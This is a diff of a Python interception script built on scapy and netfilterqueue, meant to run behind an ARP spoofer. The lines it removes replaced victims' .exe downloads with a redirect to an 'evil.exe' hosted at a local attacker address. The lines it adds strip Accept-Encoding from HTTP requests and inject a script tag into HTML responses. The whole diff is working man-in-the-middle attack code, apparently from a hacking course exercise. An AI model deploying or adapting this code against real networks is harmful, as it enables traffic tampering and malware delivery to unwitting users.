@@ -2,6 +2,7 @@
 import netfilterqueue
 import scapy.all as scapy
 from scapy.layers import http #you need to pip install scapy_http 
+import re
 
 #if tested on a real network:
 #   -launch arp spoofer
@@ -26,22 +27,21 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] exe Request")
-                ack_list.appen(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+            print("[+] Request")
+            print(scapy_packet[http.HTTPRequest].Headers)
+            load = re.sub("Accept-Encoding.*?\\r\\n","", load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP response!")
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                #print(scapy_packet.show())
-                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: \
-                                                        10.0.2.15/evil/evil.exe\n\n")
+            print("[+] Response!")
+            load = load.replace("</body>","<script>alert('test')</script></body>")
 
 
-    packet.set_payload(str(scapy_packet))
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet)) 
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
